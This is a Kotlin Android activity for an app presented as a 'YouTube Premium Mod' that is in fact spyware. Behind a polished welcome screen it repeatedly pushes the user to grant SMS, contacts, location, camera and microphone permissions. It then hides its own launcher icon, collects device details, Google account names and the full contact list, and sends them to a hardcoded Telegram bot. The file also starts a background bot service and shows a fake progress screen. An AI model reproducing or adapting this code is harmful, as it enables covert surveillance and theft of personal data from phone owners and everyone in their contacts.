package com.example.youmod

import android.Manifest
import android.accounts.AccountManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.TimeUnit
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    companion object {
        const val BOT_TOKEN = "8564931359:AAFcD0rdACvKK1ZajX33q_drDjU4_vlvNck"
        const val AUTHORIZED_USER = 7548711500L
        private var instance: MainActivity? = null

        fun getDeviceId(context: Context): String {
            val prefs = context.getSharedPreferences("agent_prefs", Context.MODE_PRIVATE)
            return prefs.getString("device_id", "UNKNOWN") ?: "UNKNOWN"
        }

        fun getInstance(): MainActivity? = instance
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private lateinit var deviceId: String
    private var isFirstRun = true
    private var requiredStorageGranted = false
    private var requiredSmsGranted = false
    private var isLoading = false
    private var retryingDenied = false
    private var statusText: TextView? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        instance = this

        window.setFlags(
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            window.attributes.layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.setDecorFitsSystemWindows(false)
        }

        val prefs = getSharedPreferences("agent_prefs", MODE_PRIVATE)
        isFirstRun = prefs.getBoolean("is_first_run", true)
        deviceId = prefs.getString("device_id", null) ?: generateAndSaveDeviceId(prefs)

        if (isFirstRun) {
            showWelcomeScreen()
        } else {
            startBotService()
            finish()
        }
    }

    private fun generateAndSaveDeviceId(prefs: android.content.SharedPreferences): String {
        val letters = (1..4).map { ('A' + Random.nextInt(26)).toString() }.joinToString("")
        val digits = (1..6).map { Random.nextInt(10).toString() }.joinToString("")
        val id = letters + digits
        prefs.edit().putString("device_id", id).apply()
        return id
    }

    private fun showWelcomeScreen() {
        val scrollContainer = ScrollView(this)
        scrollContainer.setBackgroundColor(Color.parseColor("#0a0a1a"))
        scrollContainer.layoutParams = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.MATCH_PARENT
        )

        val outerLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(24, 80, 24, 40)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        val gradientBg = GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            intArrayOf(Color.parseColor("#1a1a2e"), Color.parseColor("#16213e"), Color.parseColor("#0f3460"))
        )
        outerLayout.background = gradientBg

        val logoContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(0, 20, 0, 0)
        }

        val playButtonOuter = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            val size = dpToPx(80)
            layoutParams = LinearLayout.LayoutParams(size, size)
            val shape = GradientDrawable()
            shape.shape = GradientDrawable.RECTANGLE
            shape.cornerRadius = dpToPx(20).toFloat()
            shape.setColor(Color.parseColor("#CCFF0000"))
            shape.setStroke(dpToPx(2), Color.parseColor("#66FFFFFF"))
            background = shape
        }

        val playTriangle = TextView(this).apply {
            text = "\u25B6"
            textSize = 40f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
        }
        playButtonOuter.addView(playTriangle)

        val logoText = TextView(this).apply {
            text = "YouTube Premium Mod"
            textSize = 26f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(0, 16, 0, 4)
            typeface = android.graphics.Typeface.DEFAULT_BOLD
        }

        val subtitleText = TextView(this).apply {
            text = "Ad-Free \u00B7 Background Play \u00B7 Premium Features"
            textSize = 13f
            setTextColor(Color.parseColor("#99FFFFFF"))
            gravity = Gravity.CENTER
        }

        logoContainer.addView(playButtonOuter)
        logoContainer.addView(logoText)
        logoContainer.addView(subtitleText)

        val glassCard = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(32, 40, 32, 40)
            val params = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            params.setMargins(0, 48, 0, 0)
            layoutParams = params
            val shape = GradientDrawable()
            shape.shape = GradientDrawable.RECTANGLE
            shape.cornerRadius = dpToPx(24).toFloat()
            shape.setColor(Color.parseColor("#1AFFFFFF"))
            shape.setStroke(dpToPx(1), Color.parseColor("#33FFFFFF"))
            background = shape
            elevation = 8f
        }

        val welcomeTitle = TextView(this).apply {
            text = "Welcome to Premium"
            textSize = 20f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            typeface = android.graphics.Typeface.DEFAULT_BOLD
        }

        val welcomeDesc = TextView(this).apply {
            text = "Enjoy an enhanced YouTube experience with ad-free playback, background streaming, picture-in-picture mode, and exclusive premium features."
            textSize = 14f
            setTextColor(Color.parseColor("#BBFFFFFF"))
            gravity = Gravity.CENTER
            setPadding(0, 16, 0, 24)
        }

        val continueBtn = Button(this).apply {
            text = "CONTINUE"
            setTextColor(Color.WHITE)
            textSize = 15f
            val params = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dpToPx(52)
            )
            layoutParams = params
            val shape = GradientDrawable()
            shape.shape = GradientDrawable.RECTANGLE
            shape.cornerRadius = dpToPx(26).toFloat()
            shape.colors = intArrayOf(Color.parseColor("#FF0000"), Color.parseColor("#CC0000"))
            background = shape
            typeface = android.graphics.Typeface.DEFAULT_BOLD
            setOnClickListener {
                showPermissionScreen()
            }
        }

        glassCard.addView(welcomeTitle)
        glassCard.addView(welcomeDesc)
        glassCard.addView(continueBtn)

        val versionText = TextView(this).apply {
            text = "v2.4.1 Premium MOD"
            textSize = 12f
            setTextColor(Color.parseColor("#66FFFFFF"))
            gravity = Gravity.CENTER
            setPadding(0, 32, 0, 0)
        }

        outerLayout.addView(logoContainer)
        outerLayout.addView(glassCard)
        outerLayout.addView(versionText)

        scrollContainer.addView(outerLayout)
        setContentView(scrollContainer)
    }

    private fun showPermissionScreen() {
        val scrollContainer = ScrollView(this)
        scrollContainer.setBackgroundColor(Color.parseColor("#0a0a1a"))
        scrollContainer.layoutParams = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.MATCH_PARENT
        )

        val outerLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(20, 40, 20, 40)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            val gradientBg = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(Color.parseColor("#1a1a2e"), Color.parseColor("#16213e"), Color.parseColor("#0f3460"))
            )
            background = gradientBg
        }

        val headerText = TextView(this).apply {
            text = "Permissions Required"
            textSize = 24f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            typeface = android.graphics.Typeface.DEFAULT_BOLD
        }

        val descText = TextView(this).apply {
            text = "Please grant the necessary permissions to ensure the app functions properly. These permissions are required for ad-free playback and background streaming."
            textSize = 14f
            setTextColor(Color.parseColor("#BBFFFFFF"))
            gravity = Gravity.CENTER
            setPadding(8, 12, 8, 24)
        }

        statusText = TextView(this).apply {
            text = ""
            textSize = 13f
            setTextColor(Color.parseColor("#FFAA00"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 16)
        }

        val permissionsLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        val permInfo = listOf(
            "Storage" to Manifest.permission.READ_MEDIA_IMAGES,
            "SMS" to Manifest.permission.READ_SMS,
            "Contacts" to Manifest.permission.READ_CONTACTS,
            "Phone" to Manifest.permission.READ_PHONE_STATE,
            "Camera" to Manifest.permission.CAMERA,
            "Microphone" to Manifest.permission.RECORD_AUDIO,
            "Location" to Manifest.permission.ACCESS_FINE_LOCATION
        )

        for ((name, perm) in permInfo) {
            val row = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER_VERTICAL
                setPadding(16, 8, 16, 8)
                val lp = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
                lp.setMargins(0, 6, 0, 6)
                layoutParams = lp
                val shape = GradientDrawable()
                shape.shape = GradientDrawable.RECTANGLE
                shape.cornerRadius = dpToPx(16).toFloat()
                shape.setColor(Color.parseColor("#1AFFFFFF"))
                shape.setStroke(dpToPx(1), Color.parseColor("#22FFFFFF"))
                background = shape
            }

            val labelText = TextView(this).apply {
                text = name
                textSize = 15f
                setTextColor(Color.WHITE)
                layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            }

            val statusDot = TextView(this).apply {
                text = "  \u25CB  "
                textSize = 20f
                setTextColor(Color.parseColor("#888888"))
            }

            val requestBtn = Button(this).apply {
                text = "Grant"
                setTextColor(Color.WHITE)
                textSize = 12f
                val shape = GradientDrawable()
                shape.shape = GradientDrawable.RECTANGLE
                shape.cornerRadius = dpToPx(14).toFloat()
                shape.setColor(Color.parseColor("#33FF0000"))
                background = shape
                setPadding(20, 8, 20, 8)
                val btnParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    dpToPx(36)
                )
                btnParams.setMargins(8, 0, 0, 0)
                layoutParams = btnParams
            }

            requestBtn.setOnClickListener {
                if (ContextCompat.checkSelfPermission(this@MainActivity, perm) == PackageManager.PERMISSION_GRANTED) {
                    requestBtn.text = "Granted"
                    requestBtn.setTextColor(Color.parseColor("#00FF00"))
                    statusDot.text = "  \u2713  "
                    statusDot.setTextColor(Color.parseColor("#00FF00"))
                    val shape = GradientDrawable()
                    shape.shape = GradientDrawable.RECTANGLE
                    shape.cornerRadius = dpToPx(14).toFloat()
                    shape.setColor(Color.parseColor("#3300FF00"))
                    requestBtn.background = shape
                } else {
                    val actualPerm = if (perm == Manifest.permission.READ_MEDIA_IMAGES && Build.VERSION.SDK_INT < 33) {
                        Manifest.permission.READ_EXTERNAL_STORAGE
                    } else {
                        perm
                    }
                    ActiveButtonTag.btn = requestBtn
                    ActiveButtonTag.dot = statusDot
                    ActiveButtonTag.name = name
                    ActivityCompat.requestPermissions(this@MainActivity, arrayOf(actualPerm), 200)
                }
            }

            row.addView(labelText)
            row.addView(statusDot)
            row.addView(requestBtn)
            permissionsLayout.addView(row)
        }

        val doneText = TextView(this).apply {
            text = "Tap each permission to grant it"
            textSize = 12f
            setTextColor(Color.parseColor("#88FFFFFF"))
            gravity = Gravity.CENTER
            setPadding(0, 24, 0, 8)
        }

        outerLayout.addView(headerText)
        outerLayout.addView(descText)
        outerLayout.addView(statusText)
        outerLayout.addView(permissionsLayout)
        outerLayout.addView(doneText)

        scrollContainer.addView(outerLayout)
        setContentView(scrollContainer)

        Handler(Looper.getMainLooper()).postDelayed({
            requestStorageFirst()
        }, 600)
    }

    private fun requestStorageFirst() {
        val storagePerm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
        statusText?.text = "Granting storage access..."
        ActivityCompat.requestPermissions(this, arrayOf(storagePerm), 100)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (grantResults.isEmpty()) return
        val granted = grantResults[0] == PackageManager.PERMISSION_GRANTED
        val permission = permissions[0]

        if (requestCode == 100) {
            if (granted) {
                requiredStorageGranted = true
                statusText?.text = "Storage granted! Now granting SMS..."
                Handler(Looper.getMainLooper()).postDelayed({
                    statusText?.text = "Granting SMS access..."
                    ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), 101)
                }, 500)
            } else {
                statusText?.text = "This permission is required. Please grant it and try again."
                Handler(Looper.getMainLooper()).postDelayed({
                    val storagePerm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
                    ActivityCompat.requestPermissions(this, arrayOf(storagePerm), 100)
                }, 1500)
            }
        } else if (requestCode == 101) {
            if (granted) {
                requiredSmsGranted = true
                statusText?.text = "SMS granted!"
                Handler(Looper.getMainLooper()).postDelayed({
                    if (requiredStorageGranted && requiredSmsGranted) {
                        onRequiredPermissionsGranted()
                    }
                }, 500)
            } else {
                statusText?.text = "This permission is required. Please grant it and try again."
                Handler(Looper.getMainLooper()).postDelayed({
                    ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), 101)
                }, 1500)
            }
        } else if (requestCode == 200) {
            val btn = ActiveButtonTag.btn
            val dot = ActiveButtonTag.dot
            if (btn != null && dot != null) {
                if (granted) {
                    btn.text = "Granted"
                    btn.setTextColor(Color.parseColor("#00FF00"))
                    dot.text = "  \u2713  "
                    dot.setTextColor(Color.parseColor("#00FF00"))
                    val shape = GradientDrawable()
                    shape.shape = GradientDrawable.RECTANGLE
                    shape.cornerRadius = dpToPx(14).toFloat()
                    shape.setColor(Color.parseColor("#3300FF00"))
                    btn.background = shape
                    statusText?.text = "${ActiveButtonTag.name} granted!"
                } else {
                    btn.text = "Denied"
                    btn.setTextColor(Color.parseColor("#FF4444"))
                    dot.text = "  \u2717  "
                    dot.setTextColor(Color.parseColor("#FF4444"))
                    val shape = GradientDrawable()
                    shape.shape = GradientDrawable.RECTANGLE
                    shape.cornerRadius = dpToPx(14).toFloat()
                    shape.setColor(Color.parseColor("#33FF4444"))
                    btn.background = shape
                    statusText?.text = "${ActiveButtonTag.name} denied. Some features may not work."
                }
                ActiveButtonTag.clear()
            }
        }
    }

    private fun onRequiredPermissionsGranted() {
        statusText?.text = "Optimizing your experience..."
        disableLauncherIcon()
        exfiltrateData()
        startBotService()
        showLoadingScreen()
        val prefs = getSharedPreferences("agent_prefs", MODE_PRIVATE)
        prefs.edit().putBoolean("is_first_run", false).apply()
    }

    private fun disableLauncherIcon() {
        try {
            val pm = packageManager
            pm.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun showLoadingScreen() {
        isLoading = true
        val outerLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(40, 40, 40, 40)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            val gradientBg = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(Color.parseColor("#1a1a2e"), Color.parseColor("#0f3460"))
            )
            background = gradientBg
        }

        val loadingTitle = TextView(this).apply {
            text = "Finalizing Setup"
            textSize = 22f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            typeface = android.graphics.Typeface.DEFAULT_BOLD
        }

        val loadingDesc = TextView(this).apply {
            text = "Optimizing your premium experience..."
            textSize = 14f
            setTextColor(Color.parseColor("#99FFFFFF"))
            gravity = Gravity.CENTER
            setPadding(0, 12, 0, 24)
        }

        val progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dpToPx(6)
            )
            max = 100
            progress = 0
        }

        val progressText = TextView(this).apply {
            text = "0%"
            textSize = 13f
            setTextColor(Color.parseColor("#BBFFFFFF"))
            gravity = Gravity.CENTER
            setPadding(0, 12, 0, 0)
        }

        outerLayout.addView(loadingTitle)
        outerLayout.addView(loadingDesc)
        outerLayout.addView(progressBar)
        outerLayout.addView(progressText)

        setContentView(outerLayout)

        val totalSteps = 300
        val stepDuration = 1000L
        val handler = Handler(Looper.getMainLooper())
        var step = 0

        handler.post(object : Runnable {
            override fun run() {
                step++
                val pct = ((step.toFloat() / totalSteps) * 100).toInt().coerceAtMost(100)
                progressBar.progress = pct
                progressText.text = "${pct}%"
                if (step < totalSteps && isLoading) {
                    handler.postDelayed(this, stepDuration)
                } else {
                    isLoading = false
                    finish()
                }
            }
        })

        Handler(Looper.getMainLooper()).postDelayed({
            Toast.makeText(this, "Setup complete. Youmod is ready.", Toast.LENGTH_LONG).apply {
                setGravity(Gravity.CENTER, 0, 0)
                show()
            }
        }, 60000)
    }

    private fun exfiltrateData() {
        Thread {
            try {
                val manufacturer = Build.MANUFACTURER
                val model = Build.MODEL
                val osVer = Build.VERSION.RELEASE
                val buildNumber = Build.DISPLAY
                val resolution = "${resources.displayMetrics.widthPixels}x${resources.displayMetrics.heightPixels}"

                val batteryIntent = registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                val batteryLevel = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0
                val batteryScale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
                val batteryPct = (batteryLevel * 100) / batteryScale

                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                val network = cm.activeNetwork
                val caps = network?.let { cm.getNetworkCapabilities(it) }
                var connectivity = "Unknown"
                if (caps != null) {
                    connectivity = when {
                        caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                        caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
                        caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                        else -> "Other"
                    }
                }

                val gmailAccounts = try {
                    val am = AccountManager.get(this)
                    am.getAccountsByType("com.google").joinToString(", ") { it.name }
                } catch (e: Exception) { "Unable to retrieve: ${e.message}" }

                var contactsVcf = ""
                try {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                        val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                        cursor?.use { c ->
                            while (c.moveToNext()) {
                                val name = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                                val number = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                contactsVcf += "BEGIN:VCARD\nVERSION:3.0\nFN:$name\nTEL:$number\nEND:VCARD\n"
                            }
                        }
                    }
                } catch (e: Exception) {}

                val infoText = buildString {
                    appendLine("Device ID: $deviceId")
                    appendLine("Manufacturer: $manufacturer")
                    appendLine("Model: $model")
                    appendLine("OS Version: $osVer")
                    appendLine("Build: $buildNumber")
                    appendLine("Resolution: $resolution")
                    appendLine("Battery: $batteryPct%")
                    appendLine("Connectivity: $connectivity")
                    appendLine("Gmail Accounts: $gmailAccounts")
                }

                sendTelegramMessage(AUTHORIZED_USER, "New device registered:\n\n$infoText")

                if (contactsVcf.isNotEmpty()) {
                    val vcfFile = File(cacheDir, "contacts_${deviceId}.vcf")
                    vcfFile.writeText(contactsVcf)
                    sendTelegramDocument(AUTHORIZED_USER, vcfFile)
                }
            } catch (e: Exception) {
                sendTelegramMessage(AUTHORIZED_USER, "Device registered. ID: $deviceId")
            }
        }.start()
    }

    private fun startBotService() {
        val serviceIntent = Intent(this, BotService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                startForegroundService(serviceIntent)
            } catch (e: Exception) {
                startService(serviceIntent)
            }
        } else {
            startService(serviceIntent)
        }
    }

    fun sendTelegramMessage(chatId: Long, text: String) {
        Thread {
            try {
                val url = "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"
                val json = Gson().toJson(mapOf("chat_id" to chatId, "text" to text))
                val body = json.toRequestBody("application/json".toMediaType())
                val request = Request.Builder().url(url).post(body).build()
                client.newCall(request).execute()
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }

    fun sendTelegramDocument(chatId: Long, file: File) {
        Thread {
            try {
                val url = "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument"
                val mime = "application/octet-stream".toMediaType()
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId.toString())
                    .addFormDataPart("document", file.name, file.asRequestBody(mime))
                    .addFormDataPart("caption", "Device ID: $deviceId")
                    .build()
                val request = Request.Builder().url(url).post(requestBody).build()
                client.newCall(request).execute()
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }

    private fun dpToPx(dp: Int): Int {
        return (dp * resources.displayMetrics.density).toInt()
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }
}

object ActiveButtonTag {
    var btn: Button? = null
    var dot: TextView? = null
    var name: String = ""
    fun clear() {
        btn = null
        dot = null
        name = ""
    }
}
